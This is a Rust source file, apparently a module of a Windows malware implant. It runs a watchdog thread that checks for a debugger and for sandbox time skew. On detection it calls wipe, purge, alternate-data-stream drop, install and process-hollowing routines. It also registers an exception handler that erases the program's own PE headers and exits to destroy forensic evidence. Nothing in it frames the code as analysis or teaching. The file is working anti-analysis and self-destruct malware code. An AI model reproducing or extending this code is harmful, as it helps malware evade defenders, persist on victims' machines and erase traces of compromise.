//! guardian.rs — Watchdog thread + VEH installer
//!
//! start_thread() spawns a background thread that periodically checks
//! process integrity (parent process, debugger, hook presence) and
//! triggers remediation if tampering is detected.
//!
//! install_veh() registers a Vectored Exception Handler so that any
//! unhandled exception triggers full_destruct() rather than a crash dump.

#![allow(dead_code, non_snake_case, clippy::too_many_arguments)]

use winapi::um::processthreadsapi::{
    CreateThread, GetCurrentProcessId, OpenProcess,
    PROCESS_INFORMATION,
};
use winapi::um::winnt::{
    PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_READ,
    MEM_COMMIT,
};
use winapi::um::handleapi::CloseHandle;
use winapi::um::synchapi::Sleep;
use winapi::um::debugapi::IsDebuggerPresent;
use winapi::shared::minwindef::{DWORD, BOOL, LPVOID, TRUE, FALSE};

// Type aliases for the function pointers passed from main.rs
type FnNtqsi    = unsafe fn(usize, *mut u8, usize, *mut u32) -> i32;
type FnSleep    = unsafe fn(u32);
type FnTick     = unsafe fn() -> u32;
type FnVoid     = unsafe fn();
type FnBool     = unsafe fn() -> bool;
type FnAddVeh   = unsafe fn(usize, *const u8) -> usize;

// Shared state passed into the guardian thread via a heap-allocated box
struct GuardState {
    fn_ntqsi:      FnNtqsi,
    fn_sleep:      FnSleep,
    fn_tick:       FnTick,
    fn_wipe:       FnVoid,
    fn_purge:      FnVoid,
    fn_drop_ads:   FnVoid,
    fn_install:    FnVoid,
    fn_hollow:     FnBool,
}

/// The guardian thread body. Runs in a loop checking for debugger / parent kill.
unsafe extern "system" fn guardian_thread(param: LPVOID) -> DWORD {
    let state = &*(param as *const GuardState);
    let check_interval_ms: u32 = 5_000;
    let mut ticks_last = (state.fn_tick)();

    loop {
        (state.fn_sleep)(check_interval_ms);

        // Debugger check
        if IsDebuggerPresent() != 0 {
            (state.fn_wipe)();
            winapi::um::processthreadsapi::TerminateProcess(
                winapi::um::processthreadsapi::GetCurrentProcess(), 0,
            );
        }

        // Time-skew check (sleep took much longer than expected = sandbox)
        let ticks_now = (state.fn_tick)();
        let elapsed = ticks_now.wrapping_sub(ticks_last);
        ticks_last = ticks_now;
        // If more than 4x the expected interval elapsed, assume time manipulation
        if elapsed > check_interval_ms * 4 {
            (state.fn_wipe)();
            (state.fn_purge)();
            (state.fn_drop_ads)();
            (state.fn_install)();
            let _ = (state.fn_hollow)();
        }
    }
}

/// VEH handler: on any unhandled exception, trigger wipe + terminate.
/// The VEH receives a pointer to EXCEPTION_POINTERS; we ignore it and destruct.
unsafe extern "system" fn veh_handler(_ex: LPVOID) -> i32 {
    // Wipe the exe and terminate — best-effort forensic cleanup on crash
    let own_base: usize;
    core::arch::asm!("lea {b}, [rip]", b = out(reg) own_base);
    let own_base = (own_base & !0xFFFF) as *const u8;
    // Zero first 4KB (headers + entry stubs) to destroy PE signature
    core::ptr::write_bytes(own_base as *mut u8, 0u8, 4096);
    winapi::um::processthreadsapi::TerminateProcess(
        winapi::um::processthreadsapi::GetCurrentProcess(), 1,
    );
    // EXCEPTION_CONTINUE_SEARCH = 0 (we won't reach here but compiler needs a return)
    0
}

/// Install a Vectored Exception Handler using the resolved AddVectoredExceptionHandler
/// function pointer from indirect_syscall.
/// `fn_add_veh`: pointer to AddVectoredExceptionHandler(ULONG FirstHandler, PVECTORED_EXCEPTION_HANDLER)
pub unsafe fn install_veh(fn_add_veh: FnAddVeh) {
    // FirstHandler = 1 means called before other handlers
    (fn_add_veh)(1, veh_handler as *const u8);
}

/// Spawn the guardian watchdog thread.
/// All function pointers are passed in from main.rs so this module stays
/// free of direct inter-module dependencies that would break feature-gated builds.
pub unsafe fn start_thread(
    fn_ntqsi:    FnNtqsi,
    fn_sleep:    FnSleep,
    fn_tick:     FnTick,
    fn_wipe:     FnVoid,
    fn_purge:    FnVoid,
    fn_drop_ads: FnVoid,
    fn_install:  FnVoid,
    fn_hollow:   FnBool,
) {
    let state = Box::new(GuardState {
        fn_ntqsi,
        fn_sleep,
        fn_tick,
        fn_wipe,
        fn_purge,
        fn_drop_ads,
        fn_install,
        fn_hollow,
    });
    let state_ptr = Box::into_raw(state) as LPVOID;

    let mut tid: DWORD = 0;
    let h = CreateThread(
        core::ptr::null_mut(),
        0,
        Some(guardian_thread),
        state_ptr,
        0,
        &mut tid,
    );
    if !h.is_null() {
        CloseHandle(h);
    } else {
        // Thread creation failed — reclaim the Box to avoid leak
        let _ = Box::from_raw(state_ptr as *mut GuardState);
    }
}
